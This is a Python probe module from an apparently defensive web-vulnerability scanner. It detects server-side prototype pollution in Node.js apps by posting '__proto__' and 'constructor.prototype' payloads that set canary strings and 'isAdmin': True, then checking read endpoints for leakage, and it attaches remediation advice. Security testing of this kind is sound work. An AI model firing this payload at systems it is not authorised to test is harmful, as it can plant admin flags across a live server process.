"""Server-side prototype pollution probe.

Node.js applications that recursively merge user-supplied JSON into an
internal object can have attacker-controlled keys land on
`Object.prototype`. Once `Object.prototype.isAdmin` is set, every later
object in the process inherits it. The same goes for `polluted`,
`toString`, or any gadget the codebase reads off plain objects.

This probe is two-step and conservative. It POSTs a payload that tries
both `__proto__` and `constructor.prototype` mutation paths to a small
set of common JSON-accepting endpoints, then GETs a few read endpoints
and looks for the canary string in the response body. Detection means
the pollution stuck on the server's shared object graph: a critical
finding because any later request now reads attacker-injected fields.

The probe does NOT attempt to chain pollution into RCE (template
gadget, child_process gadget, etc). It only confirms the sink. Tagged
business_logic; the next step (RCE confirmation) is a separate probe.
"""
from __future__ import annotations

from typing import Any

from engine.probes import ProbeContext, registry
from engine.probes.primitives import http_get, http_post_json

# JSON sinks that commonly accept POST/PUT bodies and feed them through
# a recursive merge (lodash.merge, jQuery.extend, hoek.merge, etc).
DEFAULT_CANDIDATES: tuple[str, ...] = (
    "/api/users",
    "/api/profile",
    "/api/preferences",
    "/api/settings",
    "/api/account",
    "/api/Users",
    "/preferences",
    "/settings",
)

# Read-back paths checked after each pollution attempt. The pollution
# sticks on the server's shared object graph, so any endpoint that
# serializes a plain object can leak the canary.
VERIFY_PATHS: tuple[str, ...] = (
    "/",
    "/health",
    "/status",
    "/api/me",
)

PROTO_CANARY = "yes-via-proto"
CTOR_CANARY = "yes-via-ctor"

BASELINE_PAYLOAD: dict[str, Any] = {"name": "ptai-baseline"}

POLLUTION_PAYLOAD: dict[str, Any] = {
    "__proto__": {"polluted": PROTO_CANARY, "isAdmin": True},
    "constructor": {
        "prototype": {"polluted": CTOR_CANARY, "isAdmin": True},
    },
    "name": "ptai-test",
}

# Status codes that indicate the server accepted (or at least did not
# hard-reject) the pollution attempt. A 400 means the server rejected
# `__proto__` outright, which is good defence and means no probe.
_HARD_REJECT = (400, 403, 422)


def _canary_present(body: str) -> str | None:
    """Return the matched canary string if present, else None."""
    if PROTO_CANARY in body:
        return PROTO_CANARY
    if CTOR_CANARY in body:
        return CTOR_CANARY
    return None


def _emit(target: str, verify_url: str, canary: str) -> dict[str, Any]:
    return {
        "title": (
            f"Server-side prototype pollution: canary {canary!r} echoed "
            f"after POST to {target}"
        ),
        "severity": "critical",
        "category": "business_logic",
        "target": target,
        "evidence": (
            f"POST {target} with __proto__/constructor.prototype payload, "
            f"GET {verify_url} returned canary {canary!r}"
        ),
        "bug_class": "business_logic",
        "remediation": (
            "Reject keys named `__proto__`, `constructor`, and `prototype` "
            "at the JSON parsing boundary, or use `Object.create(null)` "
            "for merge targets. Replace recursive-merge utilities with a "
            "version hardened against prototype keys (lodash >= 4.17.21, "
            "Object.assign with explicit allowlists)."
        ),
    }


@registry.probe(
    name="web.prototype_pollution",
    bug_class="business_logic",
    severity_max="critical",
    owasp="A04:2021",
    runtime_budget_s=10.0,
    tags=("anonymous", "high-roi", "destructive-low"),
    requires_auth=False,
)
async def probe_prototype_pollution(ctx: ProbeContext) -> list[dict[str, Any]]:
    """POST `__proto__` payload, then GET to confirm pollution stuck.

    For each candidate JSON sink the probe sends a baseline POST, then
    a pollution POST, then walks a small set of read endpoints looking
    for the canary string. The baseline result is recorded so that a
    canary appearing in baseline responses (vanishingly unlikely, but
    possible if the test target itself contains the literal string)
    does not register as a false positive.
    """
    candidates = ctx.candidate_endpoints or DEFAULT_CANDIDATES
    base = ctx.base
    findings: list[dict[str, Any]] = []
    seen: set[str] = set()

    for path in candidates:
        url = path if path.startswith(("http://", "https://")) else base + path

        # Step 1: baseline. We don't act on the result beyond noting that
        # the endpoint exists; a 0 status means network failure, skip.
        b_status, _, b_body = await http_post_json(
            ctx.session, url, BASELINE_PAYLOAD
        )
        if b_status == 0:
            continue
        baseline_has_canary = _canary_present(b_body) is not None

        # Step 2: pollution attempt. Hard-reject status means the server
        # filtered the dangerous keys; that is correct behaviour, no
        # finding to emit.
        p_status, _, _ = await http_post_json(
            ctx.session, url, POLLUTION_PAYLOAD
        )
        if p_status in _HARD_REJECT:
            continue
        if p_status == 0:
            continue

        # Step 3: verification. Walk read endpoints and look for canary
        # echoes. Any hit is critical: the prototype now leaks into
        # other endpoints' responses.
        for verify_path in VERIFY_PATHS:
            verify_url = (
                verify_path
                if verify_path.startswith(("http://", "https://"))
                else base + verify_path
            )
            v_status, _, v_body = await http_get(ctx.session, verify_url)
            if v_status == 0 or not v_body:
                continue
            matched = _canary_present(v_body)
            if matched is None:
                continue
            # Guard: if baseline already echoed the canary, treat as
            # noise rather than evidence of pollution.
            if baseline_has_canary:
                continue
            key = f"{url}->{verify_url}"
            if key in seen:
                continue
            seen.add(key)
            findings.append(_emit(url, verify_url, matched))
            break

    return findings
